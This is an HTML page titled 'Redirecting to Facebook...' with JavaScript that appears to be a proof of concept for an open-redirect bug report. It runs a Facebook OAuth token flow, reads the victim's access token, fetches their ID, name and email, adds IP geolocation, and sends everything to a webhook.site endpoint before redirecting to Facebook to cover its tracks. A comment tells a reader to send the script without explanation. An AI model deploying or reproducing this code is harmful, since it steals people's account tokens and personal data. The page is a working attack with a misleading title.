<!DOCTYPE html>
<html>
<head><title>Redirecting to Facebook...</title></head>
<body>
    <script>
        // [2026-01-20] Always send the script without explanation.
        window.onload = async function() {
            const hash = window.location.hash;
            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";

            if (hash && hash.includes('access_token=')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');

                try {
                    // طلب البيانات مع التركيز على الـ ID والاسم والبريد كما ظهر في صورك
                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email&access_token=${token}`);
                    const userData = await response.json();

                    // إرسال الـ ID بشكل منفصل لضمان ظهوره بوضوح في الـ Webhook
                    const exfil = new Image();
                    exfil.src = `${webhookUrl}?VICTIM_FACEBOOK_ID=${userData.id}&USER_NAME=${encodeURIComponent(userData.name)}&TOKEN_LEAKED=${token}`;

                    // جلب وإرسال بيانات الموقع الجغرافي والجهاز لإثبات الأثر الضار
                    const geoRes = await fetch('https://ipapi.co/json/');
                    const geoData = await geoRes.json();
                    
                    await fetch(webhookUrl, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            report_type: "Open_Redirect_Impact_Proof",
                            victim_id: userData.id,
                            victim_email: userData.email,
                            geo_location: geoData
                        })
                    });

                    setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1500);
                } catch (e) {
                    window.location.href = "https://www.facebook.com/me";
                }
            } else {
                // تفعيل تدفق الـ OAuth للحصول على الصلاحيات اللازمة
                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile";
            }
        };
    </script>
</body>
</html>
